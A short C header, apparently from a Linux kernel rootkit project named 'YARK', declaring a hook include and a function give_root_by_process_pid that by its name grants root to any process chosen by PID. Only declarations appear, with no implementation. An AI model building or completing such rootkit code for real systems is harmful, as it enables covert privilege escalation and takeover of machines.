#ifndef YARK_GIVE_ROOT_H
#define YARK_GIVE_ROOT_H

#include <linux/version.h>

#include "yhook.h"

typedef struct task_struct * (*find_get_task_by_vpid_t)(pid_t nr);

int give_root_by_process_pid(int pid);

#endif